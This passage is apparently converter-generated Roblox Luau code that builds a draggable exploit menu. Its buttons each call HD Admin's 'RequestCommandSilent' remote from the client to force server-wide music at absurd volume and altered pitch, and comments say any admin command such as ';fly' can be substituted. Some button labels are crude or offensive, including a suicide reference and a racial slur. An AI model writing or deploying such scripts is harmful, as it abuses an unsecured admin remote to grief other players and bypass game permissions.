		G2L["12"]["Text"] = [[she told me she a b**th vra]];
		G2L["12"]["Position"] = UDim2.new(0.36887, 0, 0.50311, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["13"] = Instance.new("LocalScript", G2L["12"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextLabel
		G2L["14"] = Instance.new("TextLabel", G2L["2"]);
		G2L["14"]["TextWrapped"] = true;
		G2L["14"]["BorderSizePixel"] = 0;
		G2L["14"]["TextSize"] = 14;
		G2L["14"]["TextScaled"] = true;
		G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["14"]["BackgroundTransparency"] = 1;
		G2L["14"]["Size"] = UDim2.new(0, 138, 0, 40);
		G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["14"]["Text"] = [[Rare Music]];
		G2L["14"]["Position"] = UDim2.new(0.15952, 0, 0.39959, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["15"] = Instance.new("TextButton", G2L["2"]);
		G2L["15"]["TextWrapped"] = true;
		G2L["15"]["BorderSizePixel"] = 2;
		G2L["15"]["TextSize"] = 14;
		G2L["15"]["TextScaled"] = true;
		G2L["15"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["15"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["15"]["Text"] = [[Toxic d3r]];
		G2L["15"]["Position"] = UDim2.new(0.37143, 0, 0.62733, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["16"] = Instance.new("LocalScript", G2L["15"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["17"] = Instance.new("TextButton", G2L["2"]);
		G2L["17"]["TextWrapped"] = true;
		G2L["17"]["BorderSizePixel"] = 2;
		G2L["17"]["TextSize"] = 14;
		G2L["17"]["TextScaled"] = true;
		G2L["17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["17"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["17"]["Text"] = [[Im so dele d3r]];
		G2L["17"]["Position"] = UDim2.new(0.0381, 0, 0.62733, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["18"] = Instance.new("LocalScript", G2L["17"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["19"] = Instance.new("TextButton", G2L["2"]);
		G2L["19"]["TextWrapped"] = true;
		G2L["19"]["BorderSizePixel"] = 2;
		G2L["19"]["TextSize"] = 14;
		G2L["19"]["TextScaled"] = true;
		G2L["19"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["19"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["19"]["Text"] = [[Love Bomb d3r]];
		G2L["19"]["Position"] = UDim2.new(0.0381, 0, 0.73913, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["1a"] = Instance.new("LocalScript", G2L["19"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["1b"] = Instance.new("TextButton", G2L["2"]);
		G2L["1b"]["TextWrapped"] = true;
		G2L["1b"]["BorderSizePixel"] = 2;
		G2L["1b"]["TextSize"] = 14;
		G2L["1b"]["TextScaled"] = true;
		G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["1b"]["Size"] = UDim2.new(0, 122, 0, 46);
		G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1b"]["Text"] = [[k1ss me again]];
		G2L["1b"]["Position"] = UDim2.new(0.37143, 0, 0.73913, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["1c"] = Instance.new("LocalScript", G2L["1b"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame
		G2L["1d"] = Instance.new("ScrollingFrame", G2L["2"]);
		G2L["1d"]["Active"] = true;
		G2L["1d"]["BorderSizePixel"] = 4;
		G2L["1d"]["CanvasPosition"] = Vector2.new(0, 200);
		G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(121, 121, 121);
		G2L["1d"]["Size"] = UDim2.new(0, 108, 0, 314);
		G2L["1d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1d"]["Position"] = UDim2.new(0.72379, 0, 0.18427, 0);
		G2L["1d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
		G2L["1e"] = Instance.new("TextButton", G2L["1d"]);
		G2L["1e"]["TextWrapped"] = true;
		G2L["1e"]["BorderSizePixel"] = 3;
		G2L["1e"]["TextSize"] = 14;
		G2L["1e"]["TextScaled"] = true;
		G2L["1e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["1e"]["Size"] = UDim2.new(0, 100, 0, 36);
		G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1e"]["Text"] = [[Mayo And Noodles]];
		G2L["1e"]["Position"] = UDim2.new(-0, 0, 0, 0);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["1f"] = Instance.new("LocalScript", G2L["1e"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
		G2L["20"] = Instance.new("TextButton", G2L["1d"]);
		G2L["20"]["TextWrapped"] = true;
		G2L["20"]["BorderSizePixel"] = 3;
		G2L["20"]["TextSize"] = 14;
		G2L["20"]["TextScaled"] = true;
		G2L["20"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["20"]["Size"] = UDim2.new(0, 100, 0, 36);
		G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["20"]["Text"] = [[Live Stream my zucide]];
		G2L["20"]["Position"] = UDim2.new(-0, 0, 0.04762, 0);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["21"] = Instance.new("LocalScript", G2L["20"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
		G2L["22"] = Instance.new("TextButton", G2L["1d"]);
		G2L["22"]["TextWrapped"] = true;
		G2L["22"]["BorderSizePixel"] = 3;
		G2L["22"]["TextSize"] = 14;
		G2L["22"]["TextScaled"] = true;
		G2L["22"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["22"]["Size"] = UDim2.new(0, 100, 0, 36);
		G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["22"]["Text"] = [[AHA unpitched]];
		G2L["22"]["Position"] = UDim2.new(-0.00926, 0, 0.0971, 0);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["23"] = Instance.new("LocalScript", G2L["22"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
		G2L["24"] = Instance.new("TextButton", G2L["1d"]);
		G2L["24"]["TextWrapped"] = true;
		G2L["24"]["BorderSizePixel"] = 3;
		G2L["24"]["TextSize"] = 14;
		G2L["24"]["TextScaled"] = true;
		G2L["24"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["24"]["Size"] = UDim2.new(0, 100, 0, 36);
		G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["24"]["Text"] = [[Blood Pop Loud]];
		G2L["24"]["Position"] = UDim2.new(-0.00926, 0, 0.14453, 0);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["25"] = Instance.new("LocalScript", G2L["24"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
		G2L["26"] = Instance.new("TextButton", G2L["1d"]);
		G2L["26"]["TextWrapped"] = true;
		G2L["26"]["BorderSizePixel"] = 3;
		G2L["26"]["TextSize"] = 14;
		G2L["26"]["TextScaled"] = true;
		G2L["26"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["26"]["Size"] = UDim2.new(0, 100, 0, 36);
		G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["26"]["Text"] = [[OG Blood Pop]];
		G2L["26"]["Position"] = UDim2.new(-0.00926, 0, 0.19401, 0);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["27"] = Instance.new("LocalScript", G2L["26"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
		G2L["28"] = Instance.new("TextButton", G2L["1d"]);
		G2L["28"]["TextWrapped"] = true;
		G2L["28"]["BorderSizePixel"] = 3;
		G2L["28"]["TextSize"] = 14;
		G2L["28"]["TextScaled"] = true;
		G2L["28"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["28"]["Size"] = UDim2.new(0, 100, 0, 36);
		G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["28"]["Text"] = [[suger Crash]];
		G2L["28"]["Position"] = UDim2.new(-0, 0, 0.24659, 0);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["29"] = Instance.new("LocalScript", G2L["28"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
		G2L["2a"] = Instance.new("TextButton", G2L["1d"]);
		G2L["2a"]["TextWrapped"] = true;
		G2L["2a"]["BorderSizePixel"] = 3;
		G2L["2a"]["TextSize"] = 14;
		G2L["2a"]["TextScaled"] = true;
		G2L["2a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["2a"]["Size"] = UDim2.new(0, 100, 0, 36);
		G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2a"]["Text"] = [[Little Darkie]];
		G2L["2a"]["Position"] = UDim2.new(-0.00926, 0, 0.2971, 0);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["2b"] = Instance.new("LocalScript", G2L["2a"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
		G2L["2c"] = Instance.new("TextButton", G2L["1d"]);
		G2L["2c"]["TextWrapped"] = true;
		G2L["2c"]["BorderSizePixel"] = 3;
		G2L["2c"]["TextSize"] = 14;
		G2L["2c"]["TextScaled"] = true;
		G2L["2c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["2c"]["Size"] = UDim2.new(0, 100, 0, 36);
		G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2c"]["Text"] = [[Rampage REUPLOAD]];
		G2L["2c"]["Position"] = UDim2.new(-0.00926, 0, 0.35174, 0);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["2d"] = Instance.new("LocalScript", G2L["2c"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
		G2L["2e"] = Instance.new("TextButton", G2L["1d"]);
		G2L["2e"]["TextWrapped"] = true;
		G2L["2e"]["BorderSizePixel"] = 3;
		G2L["2e"]["TextSize"] = 14;
		G2L["2e"]["TextScaled"] = true;
		G2L["2e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["2e"]["Size"] = UDim2.new(0, 100, 0, 36);
		G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2e"]["Text"] = [[Phonk]];
		G2L["2e"]["Position"] = UDim2.new(-0.00926, 0, 0.4002, 0);
	
	
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["2f"] = Instance.new("LocalScript", G2L["2e"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.LocalScript
		local function C_3()
			local script = G2L["3"];
	
			local UserInputService = game:GetService("UserInputService")
			local runService = (game:GetService("RunService"));
	
			local gui = script.Parent
	
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			function Lerp(a, b, m)
				return a + (b - a) * m
			end;
	
			local lastMousePos
			local lastGoalPos
			local DRAG_SPEED = (8); -- // The speed of the UI darg.
			function Update(dt)
				if not (startPos) then return end;
				if not (dragging) and (lastGoalPos) then
					gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
					return 
				end;
	
				local delta = (lastMousePos - UserInputService:GetMouseLocation())
				local xGoal = (startPos.X.Offset - delta.X);
				local yGoal = (startPos.Y.Offset - delta.Y);
				lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
				gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
			end;
	
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
					lastMousePos = UserInputService:GetMouseLocation()
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			runService.Heartbeat:Connect(Update)
	
		end;
		task.spawn(C_3);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_5()
			local script = G2L["5"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 129784044703578")
				RequestCommandSilent:InvokeServer(";pitch 0.11")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_5);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_7()
			local script = G2L["7"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 84258984844042")
				RequestCommandSilent:InvokeServer(";pitch 0.111")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_7);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_9()
			local script = G2L["9"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 100384216498934")
				RequestCommandSilent:InvokeServer(";pitch 0.111")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_9);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_b()
			local script = G2L["b"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 105707572244741")
				RequestCommandSilent:InvokeServer(";pitch 0.07")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_b);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_d()
			local script = G2L["d"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 85243009071554")
				RequestCommandSilent:InvokeServer(";pitch 0.09")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_d);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_f()
			local script = G2L["f"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 97893884327457")
				RequestCommandSilent:InvokeServer(";pitch 0.075")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_f);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_11()
			local script = G2L["11"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 91413191298207")
				RequestCommandSilent:InvokeServer(";pitch 1.12")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_11);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_13()
			local script = G2L["13"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 86802856991233")
				RequestCommandSilent:InvokeServer(";pitch 1.12")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_13);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_16()
			local script = G2L["16"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 86412047196482")
				RequestCommandSilent:InvokeServer(";pitch 1.12")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_16);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_18()
			local script = G2L["18"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 103289460753069")
				RequestCommandSilent:InvokeServer(";pitch 1.12")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_18);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_1a()
			local script = G2L["1a"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 18841888868")
				RequestCommandSilent:InvokeServer(";pitch 1.12")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_1a);
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_1c()
			local script = G2L["1c"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 136592453882220")
				RequestCommandSilent:InvokeServer(";pitch 0.121")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_1c);
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_1f()
			local script = G2L["1f"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 92270747179845")
				RequestCommandSilent:InvokeServer(";pitch 1.12")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
	
		end;
		task.spawn(C_1f);
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_21()
			local script = G2L["21"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 110883769352852")
				RequestCommandSilent:InvokeServer(";pitch 0.1")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
	
		end;
		task.spawn(C_21);
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_23()
			local script = G2L["23"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 138777186312745")
				RequestCommandSilent:InvokeServer(";pitch 1")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
	
		end;
		task.spawn(C_23);
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_25()
			local script = G2L["25"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 128622842743995")
				RequestCommandSilent:InvokeServer(";pitch 0.11")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
	
		end;
		task.spawn(C_25);
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_27()
			local script = G2L["27"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 136111288303730")
				RequestCommandSilent:InvokeServer(";pitch 0.2")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
				--i just have that nga, of you want more dm me at roadblockswashere
	
	
	
	
	
	
	
	
	
	
			end)
	
	
		end;
		task.spawn(C_27);
		-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_29()
			local script = G2L["29"];
			script.Parent.MouseButton1Click:Connect(function()
	
				-- first you want to know about hd admin remote or shit there silent hd admin command
	
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";music 118510088348722")
				RequestCommandSilent:InvokeServer(";pitch 0.2")
				RequestCommandSilent:InvokeServer(";volume 24141224")
	
				--                                                           ^ put a command like ;fly
